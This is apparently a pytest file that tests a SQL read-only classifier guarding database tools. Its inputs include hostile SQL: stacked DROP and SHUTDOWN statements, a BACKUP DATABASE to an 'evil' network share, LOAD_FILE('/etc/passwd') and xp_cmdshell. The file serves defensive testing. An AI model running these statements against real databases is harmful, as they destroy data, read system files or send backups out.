"""Tests for the shared SQL read-only/side-effect classifier."""

import re

from mcp_servers.shared.sql_safety import (
    is_multi_statement,
    is_read_only_safe,
    strip_sql_literals,
)

# is_read_only_safe() already strips literals + comments internally, so tests
# below call it directly with raw SQL rather than pre-stripping.


def test_read_only_safe_accepts_plain_select():
    assert is_read_only_safe("SELECT * FROM users WHERE id = 5") is True
    assert is_read_only_safe("WITH x AS (SELECT 1) SELECT * FROM x") is True


def test_read_only_safe_rejects_data_modifying_cte():
    assert is_read_only_safe(
        "WITH d AS (DELETE FROM t RETURNING *) SELECT * FROM d"
    ) is False


def test_read_only_safe_rejects_side_effecting_function():
    assert is_read_only_safe("SELECT pg_terminate_backend(1)") is False
    assert is_read_only_safe("SELECT setval('s', 1)") is False


def test_read_only_safe_rejects_stacked_statement():
    assert is_read_only_safe("SELECT 1; UPDATE t SET x=1") is False


def test_read_only_safe_ignores_keywords_inside_literals():
    # 'delete'/'create' inside a string literal must NOT trip the write check
    assert is_read_only_safe("SELECT note FROM t WHERE note = 'please delete later'") is True


def test_strip_and_multi_statement_helpers():
    assert "';UPDATE" not in strip_sql_literals("SELECT '--' ; x")
    assert is_multi_statement("SELECT 1; DROP TABLE t") is True
    # ';' inside a literal is data — but is_multi_statement's contract is to
    # receive literal-STRIPPED text (all callers strip first), so test it that
    # way. On raw text the any-';' rule would (correctly) see the literal's ';'.
    assert is_multi_statement(strip_sql_literals("SELECT 1 WHERE x = 'a;b'")) is False


def test_multi_statement_flags_any_stacked_verb_not_just_allowlisted():
    """R-4 C1 regression: SQL Server's direct path (pytds) runs the WHOLE
    ';'-batch, so ANY second statement is dangerous — not only ones starting
    with a keyword the old allowlist happened to list. A safe SELECT prefix
    followed by a T-SQL verb that was NOT allowlisted (SHUTDOWN/BACKUP/RESTORE/
    DENY/RECONFIGURE/DISABLE TRIGGER/a custom EXEC) was auto-executing without
    approval. Both the multi-statement helper and the read-only gate must catch
    every one."""
    for sql in [
        "SELECT 1; SHUTDOWN",
        "SELECT 1; BACKUP DATABASE appdb TO DISK=N'\\\\evil\\share\\a.bak'",
        "SELECT 1; RESTORE DATABASE appdb FROM DISK=N'a.bak'",
        "SELECT 1; DENY SELECT ON dbo.t TO app",
        "SELECT 1; RECONFIGURE",
        "SELECT 1; DISABLE TRIGGER trg ON dbo.t",
        "SELECT 1; EXEC dbo.SomeCustomProc",
    ]:
        assert is_multi_statement(strip_sql_literals(sql)) is True, sql
        assert is_read_only_safe(sql) is False, sql


def test_single_statement_with_trailing_semicolon_is_not_multi():
    """A single statement, with or without a trailing ';' (and whitespace, or
    repeated empty ';'), is NOT multi — the rule strips trailing separators
    before looking for an interior one."""
    for sql in ["SELECT 1", "SELECT 1;", "SELECT 1 ;  ", "SELECT 1;;"]:
        assert is_multi_statement(strip_sql_literals(sql)) is False, sql
        assert is_read_only_safe(sql) is True, sql


def test_semicolon_inside_literal_is_not_multi_after_strip():
    """A ';' inside a string literal is data, not a separator: once literals are
    stripped it must NOT read as multi-statement (keywords inside the literal go
    too, so these stay read-only safe)."""
    for sql in [
        "SELECT * FROM t WHERE note = 'a;b'",
        "SELECT * FROM t WHERE note = 'xp_cmdshell; drop'",
    ]:
        assert is_multi_statement(strip_sql_literals(sql)) is False, sql
        assert is_read_only_safe(sql) is True, sql


def test_mysql_executable_comment_content_is_preserved():
    """MySQL `/*! ... */`는 Aurora MySQL에서 실제 실행되므로 내부 SQL을
    classifier가 봐야 한다. 일반 주석처럼 지우면 DROP/TRUNCATE 우회가 된다
    (Codex 감사). 내부 키워드가 sanitized 결과에 살아남는지 검증."""
    stripped = strip_sql_literals("SELECT 1 /*! DROP TABLE users */")
    assert "DROP" in stripped.upper()
    assert "TABLE" in stripped.upper()


def test_mysql_versioned_executable_comment_preserved():
    stripped = strip_sql_literals("/*!50000 TRUNCATE orders */ SELECT 1")
    assert "TRUNCATE" in stripped.upper()


def test_plain_block_comment_still_stripped():
    """비실행 주석은 종전대로 제거 — 주석 속 키워드로 인한 오탐 방지."""
    stripped = strip_sql_literals("SELECT 1 /* DROP TABLE users */")
    assert "DROP" not in stripped.upper()


def test_mysql_side_effecting_patterns():
    """MySQL equivalents of PG_TERMINATE_BACKEND/PG_SLEEP/advisory locks —
    KILL, SLEEP(), GET_LOCK/RELEASE_LOCK, LOAD_FILE, LOCK/UNLOCK TABLES, BENCHMARK
    must classify as side-effecting (not safe) for the R-3 direct-TCP path."""
    for sql in [
        "KILL 1234",
        "SELECT SLEEP(600)",
        "SELECT GET_LOCK('x', 5)",
        "SELECT RELEASE_LOCK('x')",
        "SELECT LOAD_FILE('/etc/passwd')",
        "LOCK TABLES t WRITE",
        "UNLOCK TABLES",
        "SELECT BENCHMARK(100000000, MD5('x'))",
    ]:
        assert is_read_only_safe(sql) is False, sql


def test_mysql_plain_reads_stay_safe():
    """`'sleep(1)'` inside a string literal and `killed_count` as a column
    name must NOT trip the new patterns (literal-stripping + word boundaries)."""
    for sql in [
        "SELECT * FROM t WHERE name = 'sleep(1)'",
        "SHOW ENGINE INNODB STATUS",
        "SELECT killed_count FROM stats",
    ]:
        assert is_read_only_safe(sql) is True, sql


def test_tsql_side_effecting_patterns():
    """T-SQL: pytds sends the whole batch and SQL Server runs ALL of it (no
    multi-statement guard from the driver, unlike pymysql) — these must
    classify as side-effecting regardless of statement position."""
    for sql in [
        "WAITFOR DELAY '00:00:10'",
        "WAITFOR TIME '22:00'",
        "EXEC xp_cmdshell 'dir'",
        "EXEC sp_configure 'show advanced options', 1",
        "BULK INSERT t FROM 'file.csv'",
        "SELECT * FROM OPENROWSET('SQLNCLI', 'server'; 'user'; 'pw', 'SELECT 1')",
        "SELECT * FROM OPENQUERY(linked, 'SELECT 1')",
        "EXEC sp_executesql N'SELECT 1'",
        "DBCC CHECKDB",
        "EXECUTE sys.sp_helpdb",
    ]:
        assert is_read_only_safe(sql) is False, sql


def test_tsql_batch_stacked_statement_is_dangerous_and_unsafe():
    """T-SQL executes `;`-separated statements as one native batch — the
    existing multi-statement + DANGEROUS_PATTERNS scan of the whole text must
    still catch this (R-4 recon fact), not just a PG/MySQL-shaped payload."""
    sql = "SELECT 1; DROP TABLE x"
    assert is_read_only_safe(sql) is False
    assert re.search(r"\bDROP\b", sql.upper()) is not None


def test_tsql_word_boundaries_and_literal_stripping_stay_safe():
    """`sp_configure` must not match a column named `sp_configured_flag`;
    plain sys.* catalog reads and a string literal containing 'xp_cmdshell'
    must stay safe."""
    for sql in [
        "SELECT sp_configured_flag FROM t",
        "SELECT name FROM sys.databases",
        "SELECT execution_count FROM sys.dm_exec_query_stats",
        "SELECT * FROM t WHERE note = 'xp_cmdshell'",
    ]:
        assert is_read_only_safe(sql) is True, sql
